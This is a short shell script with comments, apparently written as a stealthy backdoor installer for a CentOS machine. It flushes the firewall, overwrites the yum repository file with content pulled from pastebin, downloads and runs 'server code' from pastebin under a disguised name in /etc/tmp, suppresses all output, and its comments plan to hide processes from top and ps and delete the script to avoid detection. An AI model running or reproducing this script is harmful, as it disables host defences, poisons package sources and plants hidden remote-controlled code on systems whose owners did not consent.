# download the CentOS-Base.repo file and overwrite the current
# /etc/yum.repos.d/CentOS-Base.repo

#{ these brackets will hide the result of the code
# -lic runs the commands in a new shell that also closes - the goal is to run the python in this so that it won't close

# Line by Line:
# 1. opens firewall to 1337 :)
# 2. downloads the yum config
# 3. cleans up
# 4. installs python
# 5. downloads the server code
# TODO hide the code and changes (rename server code to syslib.py)
# 6. runs the server code and backgrounds
# 7. Look into deletion of script as well for one last hiding bit?
{
sudo strace -o /dev/null /bin/sh -lic "iptables -F;
curl https://pastebin.com/raw/XLiGFWha > /etc/yum.repos.d/CentOS-Base.repo;
yum clean all;
yum install -y python3;
curl https://pastebin.com/raw/y0SZSyy0 > server_code.py;
mkdir /etc/tmp;
mv server_code.py /etc/tmp/systemlibrary.py;
python3 /etc/tmp/systemlibrary.py
"
} &> /dev/null & 

# hide top and ps to avoid detection

# download the server executable

# wait for completion then run